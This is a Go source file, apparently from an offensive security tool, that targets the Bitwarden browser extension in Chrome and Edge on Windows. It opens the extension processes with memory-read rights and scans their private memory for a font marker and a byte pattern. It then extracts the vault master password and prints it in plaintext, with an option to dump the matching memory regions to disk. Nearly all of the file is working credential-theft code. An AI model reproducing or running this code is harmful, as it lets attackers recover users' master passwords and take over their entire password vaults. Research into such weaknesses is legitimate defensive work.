package main

import (
	"bytes"
	"fmt"
	"regexp"
	"strings"
	"syscall"
	"unicode"

	"github.com/0xrawsec/golang-win32/win32"
	"github.com/0xrawsec/golang-win32/win32/kernel32"
	"github.com/shirou/gopsutil/v3/process"
)

// Original Bitwarden extension font pattern
var magicPattern = []byte{0x66, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x2d, 0x00, 0x66, 0x00, 0x61, 0x00, 0x63, 0x00, 0x65, 0x00}

// TODO maybe put this into a new go process library, call it e.g. getPIDsForProcessName?
// it'd need to take the exeNames as an input
func getFilteredProcs(procList []*process.Process) ([]int32, error) {

	var targetProcs []int32

	for i := range procList {
		pid := procList[i].Pid
		exeName, _ := procList[i].Name()
		cmdLine, _ := procList[i].Cmdline()

		// Only Chrome and MSEdge have been tested
		if exeName == "msedge.exe" || exeName == "chrome.exe" {
			// Get extension processes
			if strings.Contains(cmdLine, ExtensionPS) {
				targetProcs = append(targetProcs, pid)
			}
		}
	}

	if len(targetProcs) == 0 {
		return nil, fmt.Errorf("[!] Target process list empty!")
	}

	return targetProcs, nil
}

// TODO As above, could be in a library
func searchProcessMemory(pid int) error {
	// Open the process with appropriate access rights
	da := uint32(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION)
	hProcess, err := syscall.OpenProcess(da, false, uint32(pid))
	if err != nil {
		return err
	}
	defer kernel32.CloseHandle(win32.HANDLE(hProcess))

	fmt.Printf("[+] Searching memory of PID (%d)\n", pid)

	for mbi := range kernel32.AllVirtualQueryEx(win32.HANDLE(hProcess)) {
		// Filter by type, state, protection and regionsize
		// Docs: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
		if mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE {

			if mbi.RegionSize < (1 << 25) {
				mem := make([]byte, mbi.RegionSize)
				lpAddress := win32.LPCVOID(mbi.BaseAddress)
				kernel32.ReadProcessMemory(win32.HANDLE(hProcess), lpAddress, mem)

				// Search for magic pattern in each memory region
				searchBytePattern(pid, mem, mbi)
			}
		}
	}
	return nil
}

// TODO As above, could be in a library. Would need RegexBytePattern as an argument
func searchBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) {
	if bytes.Contains(mem, magicPattern) {
		fmt.Printf("[+] Found pattern at MemBaseAddr (0x%x)\n", mbi.BaseAddress)

		// Open out file
		if dumpMemoryOption {
			writeMemoryRegions(pid, mbi.BaseAddress, mem)
		}

		// Search for password prefix pattern: 04 00 00 00 ?? 00 00 00 01
		r, err := regexp.Compile(RegexBytePattern)
		if err != nil {
			fmt.Printf("[!] Offset not found")
		}

		patternOffsetAddr := r.FindIndex(mem)

		if len(patternOffsetAddr) != 0 {
			// Extract password length and offset
			// Pattern: 04 00 00 00 XX 00 00 00 01
			passLenOffset := patternOffsetAddr[0] + 4
			passOffset := patternOffsetAddr[0] + 12
			passLen := mem[passLenOffset]

			str := bytes.NewBuffer(mem[passOffset : passOffset+int(passLen)]).String()

			fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])
			fmt.Printf("[+] Found password length (0x%02x) or %d characters\n", passLen, passLen)

			// Bitwarden web registeration has a minimum 8 characters
			// for master password and filter out non-ASCII characters
			if passLen >= 8 && isASCII(str) {
				fmt.Printf("[+] Password: %s\n\n", str)
			} else {
				fmt.Printf("[!] Contains non-ASCII characters, skipping...\n\n")
			}

		} else {
			fmt.Printf("[!] Password not found :(\n\n")
		}

	} else {
		// On Windows 10 the pattern may be:
		// 05 00 00 00 XX instead of 04 00 00 00 XX
		r, err := regexp.Compile(RegexBytePattern)
		if err != nil {
			fmt.Printf("[!] Offset not found")
		}

		patternOffsetAddr := r.FindIndex(mem)

		if len(patternOffsetAddr) != 0 {
			fmt.Printf("[+] Searching MemBaseAddr (0x%x)\n", mbi.BaseAddress)
			// Extract password length and offset
			// e.g. Pattern: 04 00 00 00 XX 00 00 00 01
			passLenOffset := patternOffsetAddr[0] + 4
			passOffset := patternOffsetAddr[0] + 12
			passLen := mem[passLenOffset]

			str := bytes.NewBuffer(mem[passOffset : passOffset+int(passLen)]).String()

			// TODO
			// More checks on master password str, or make blacklist

			fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])
			fmt.Printf("[+] Found password length (0x%02x) or %d characters\n", passLen, passLen)

			// Registering on Bitwarden Vault requires the password
			// to be at least 8 long and have ASCII characters
			if passLen >= 8 && isASCII(str) {
				fmt.Printf("[+] Password: %s\n\n", str)
			} else {
				// Show a general error
				fmt.Printf("[!] Contains non-ASCII characters, skipping...\n\n")
			}
		}
	}
}

// Source: https://stackoverflow.com/questions/53069040/checking-a-string-contains-only-ascii-characters
func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] > unicode.MaxASCII {
			return false
		}
	}
	return true
}
